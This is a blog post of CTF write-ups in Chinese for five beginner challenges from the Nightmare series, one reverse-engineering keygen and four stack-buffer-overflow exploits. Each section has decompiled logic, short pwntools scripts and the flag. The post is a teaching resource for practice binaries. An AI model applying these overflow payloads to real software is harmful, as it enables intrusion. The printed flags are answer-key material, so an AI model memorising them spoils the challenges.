---
title: 'Writeups: Nightmare Series'
date: '2024-07-24'
lastmod: '2024-07-27'
tags: ['CTF','Writeup', 'Pwn', 'Nightmare']
draft: false
summary: 'Writeups for Nightmare Series'
authors: ['default']
---

<div className="border-solid border-2 border-surface0 dark:border-surface0-dark p-2 bg-base dark:bg-base-dark mt-5">
  <TOCInline toc={props.toc} asDisclosure />
</div>

## CSAW 2019 beleaf

### Information

 - Category: Reverse
 - Points: 50

### Description

> tree sounds are best listened to by https://binary.ninja/demo or ghidra

<Download name="beleaf" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/03-beginner_re/csaw19_beleaf/beleaf" type="Binary" />

### Writeup

简单运行一下程序：

```plain-text
λ ~/ ./beleaf
Enter the flag
>>> i dont have the fucking flag
Incorrect!
```

一些基本信息：

```plain-text
λ ~/ file beleaf
beleaf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6d305eed7c9bebbaa60b67403a6c6f2b36de3ca4, stripped
```

大概可以推测出我们的目标就是弄到一个正确的 `flag`。

丢到 IDA 里发现，输入长度小于等于 32 (0x20) 会输出 `Incorrect!`，所以 `flag` 长度起码 33 字节。

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/24/pkb9i4O.png" width={1920} height={1080} />
</center>

接下来进入一个简单的 for 循环，将我们输入的每一个字符逐一放到 `calc_idx` 函数中，并将返回值与 `valid_arr[i]` 比较，如果不等于 `valid_arr[i]` 则输出 `Incorrect!`。如果所有字符都通过了验证，则输出 `Correct!`

再看看 `calc_idx` 函数，大致可以看出它的作用是根据传入的字符查找它在 `charset` 中对应的索引。

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/24/pkb9kCD.png" width={1920} height={1080} />
</center>

`calc_idx` 的核心如下：

 - `character == charset[i]` 则返回索引 `i`
 - `character >= charset[i]` 则设置索引为 `i = 2 * (i + 1)`
 - 否则设置索引为 `i = 2 * i + 1`

因此我们构造 `flag` 的关键条件就是：

 - `flag` 长度 >= 33
 - `calc_idx(input[i]) == valid_arr[i]`

### Exploit

```python
#!/usr/bin/python3

import sys

valid_arr = [
    0x01, 0x09, 0x11, 0x27, 0x02,
    0x00, 0x12, 0x03, 0x08, 0x12,
    0x09, 0x12, 0x11, 0x01, 0x03,
    0x13, 0x04, 0x03, 0x05, 0x15,
    0x2E, 0x0A, 0x03, 0x0A, 0x12,
    0x03, 0x01, 0x2E, 0x16, 0x2E,
    0x0A, 0x12, 0x06
]

charset = [
    0x00000077, 0x00000066, 0x0000007B, 0x0000005F, 0x0000006E,
    0x00000079, 0x0000007D, 0xFFFFFFFF, 0x00000062, 0x0000006C,
    0x00000072, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0x00000061, 0x00000065, 0x00000069,
    0xFFFFFFFF, 0x0000006F, 0x00000074, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000067,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0x00000075
]

def create_charset():
    result = ''

    for c in charset:
        try:
            result += chr(c)
        except OverflowError:
            continue

    return result

def checker(char):
    i = 0
    while char != charset[i]:
        if char >= charset[i]:
            i = 2 * (i + 1)
        else:
            i = 2 * i + 1
    return i

def main():
    charset = create_charset()

    i = 0
    while (i < 33):
        for c in charset:
            if checker(ord(c)) == valid_arr[i]:
                sys.stdout.write(c)
        i += 1

if __name__ == '__main__':
    main()
```

### Flag

Flag: `flag{we_beleaf_in_your_re_future}`

## CSAW 2018 Quals Boi

### Information

 - Category: Pwn
 - Points: 25

### Description

> Only big boi pwners will get this one!

<Download name="boi" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/csaw18_boi/boi" type="Binary" />

### Writeup

```plain-text
λ ~/ file boi
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
λ ~/ pwn checksec boi
[*] '/home/cub3y0nd/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

试运行一下，发现它只是输出系统时间：

```plain-text
λ ~/ ./boi
Are you a big boiiiii??
aaaa
Thu Jul 25 05:35:00 PM CST 2024
```

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/25/pkbJ5H1.png" width={1920} height={1080} />
</center>

从 IDA 里面可以看出，程序可以将一个 24 (0x18) 字节 数据读入 `buf` 中。如果 `v5` 的 HIDWORD（高位四字节）等于 `0xCAF3BAEE` 则返回 shell，否则返回系统时间。

所以我们的思路就是溢出，然后覆盖原始数据。

下面是两种得到溢出点的方法：

1. 由于 `buf` 只有 16 字节大小（2 * __int64），而 `read` 却可以读取 24 字节数据，所以这里存在栈溢出漏洞，可以覆盖变量 `v5` 的内容。所以 payload 可以是 16（填满 buf） + 4（填满 4 字节低位使后面的数据可以直接覆盖高位数据，也就是做判断的部分） 字节垃圾数据 + `0xCAF3BAEE`。
2. 通过调试知道溢出点是 20 (0x14)：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/25/pkbYnU0.png" width={1920} height={1080} />
</center>

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./boi')

payload = b'A' * 0x14 + p32(0xcaf3baee)

target.send(payload)
target.interactive()
```

### Flag

Flag: `flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}`

## TAMU 2019 pwn1

### Information

 - Category: Pwn
 - Points: Unknow

### Description

> Unknow

<Download name="pwn1" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/tamu19_pwn1/pwn1" type="Binary" />

### Writeup

```plain-text
λ ~/ file boi
pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd
7aa1accb16feac888c99841f504, not stripped
λ ~/ pwn checksec pwn1
[*] '/home/cub3y0nd/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```plain-text
λ ~/ ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
aaaa
I don't know that! Auuuuuuuugh!
```

咋一看好像没啥东西，丢到 IDA 里面瞧瞧：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/26/pkb4IlF.png" width={1920} height={1080} />
</center>

显然，根据伪代码可以轻易的知道如何绕过前两问的输入。然后第三问采用了一个 `gets()` 函数接收输入，输入保存到一个 43 字节大小的字符数组里面。由于 `gets()` 不检查输入大小，因此超过 `input` 容量的内容会溢出到 `v5`。最后如果 `v5 == 0xDEA110C8` 则输出 `flag`。

所以思路就是先回答前两问，然后填满 `input`，将 `0xDEA110C8` 溢出到变量 `v5`，结束。

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./pwn1')

recvuntil = lambda str : print(target.recvuntil(str))

payload = b'A' * 0x2b + p32(0xdea110c8)

recvuntil(b'What... is your name?')
target.sendline(b'Sir Lancelot of Camelot')
recvuntil(b'What... is your quest?')
target.sendline(b'To seek the Holy Grail.')
recvuntil(b'What... is my secret?')
target.sendline(payload)
target.interactive()
```

### Flag

Flag: `flag{g0ttem_b0yz}`

## Tokyo Westerns CTF 3rd 2017 JustDoIt

### Information

 - Category: Pwn
 - Points: Unknow

### Description

> Unknow

<Download name="just_do_it" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/tw17_justdoit/just_do_it" type="Binary" />

### Writeup

```plain-text
λ ~/ file just_do_it
just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
λ ~/ pwn checksec just_do_it
[*] '/home/cub3y0nd/just_do_it'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```plain-text
λ ~/ ./just_do_it
Welcome my secret service. Do you know the password?
Input the password.
aaaa
Invalid Password, Try Again!
```

可能是要获得密码打印 `flag`，丢到 IDA 看看：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqmom8.png" width={1920} height={1080} />
</center>

看伪代码发现，就算提供了正确的密码也只是输出一条消息而已，得到密码好像并没有什么用。这就是一个障眼法！

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqmLfs.png" width={1920} height={1080} />
</center>

虽然不需要密码，但是如果你好奇密码的话，也不是不行... 通过 IDA 我们知道密码是 `P@SSW0RD`，于是乎：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqn97F.png" width={1920} height={1080} />
</center>

这里即使有了正确的密码还是提示密码错误的原因是 `fgets` 函数会把换行符也读进去。所以我们只需要在密码后面加上空字符 `\0` 就可以去掉换行符了。

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqnp0U.png" width={1920} height={1080} />
</center>

扯远了...

通过之前的伪代码可以发现，`fgets` 接收的输入大小远超 `input` 可容纳的大小。因此通过调试可以知道溢出 padding 是 20 字节：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqnApR.png" width={1920} height={1080} />
</center>

那么有了溢出 padding 后怎么获取 flag 呢？

由伪代码知，它会从 `stream` 里面读取 48 字节的数据，保存到 `flag` 变量里面。那么我们如果可以直接输出 `flag` 就好了。这里有一个思路是利用之前的溢出漏洞，将 `input` 填满后把 `flag` 变量的地址溢出给 `v6`，这就会导致 `puts` 输出 `flag` 变量的内容。perfect 移花接木

嗯...这样就很清晰了。通过 IDA 直接看 `flag` 在 `.bss` 中的地址：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqnQtH.png" width={1920} height={1080} />
</center>

当然，如果你想验证它是不是真我们所想覆盖了 `v6` 让 `puts` 输出 `flag` 的内容：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqntnf.png" width={1920} height={1080} />
</center>

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./just_do_it')

payload = b'A' * 0x14 + p32(0x0804A080)

target.sendline(payload)
target.interactive()
```

### Flag

Flag: `TWCTF{pwnable_warmup_I_did_it!}`

## CSAW 2016 Quals Warmup

### Information

 - Category: Pwn
 - Points: 50

### Description

> So you want to be a pwn-er huh? Well let's throw you an easy one ;)

<Download name="warmup" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/05-bof_callfunction/csaw16_warmup/warmup" type="Binary" />

### Writeup

```plain-text
λ ~/ file warmup
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
λ ~/ pwn checksec warmup
[*] '/home/cub3y0nd/warmup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```plain-text
λ ~/ ./warmup
-Warm Up-
WOW:0x40060d
>wow
```

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/28/pkqh8T1.png" width={1920} height={1080} />
</center>

这种题真就是闭着眼睛做... 一眼出思路：溢出 `v5` 覆盖返回地址为 `easy` 函数即可。

值得注意的是首先要了解函数调用约定和栈帧布局，这样才能准确的覆盖返回地址。可以参考下面两篇文章：

 - [C 语言函数调用栈（一）](http://www.cnblogs.com/clover-toeic/p/3755401.html)
 - [C 语言函数调用栈（二）](http://www.cnblogs.com/clover-toeic/p/3756668.html)

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./warmup')

gdb.attach(target, 'b *main+135')
pause()

payload = b'A' * (64 + 8) + p64(0x40060d)

target.sendline(payload)
pause()
target.interactive()
```

### Flag

Flag: `FLAG{LET_US_BEGIN_CSAW_2016}`

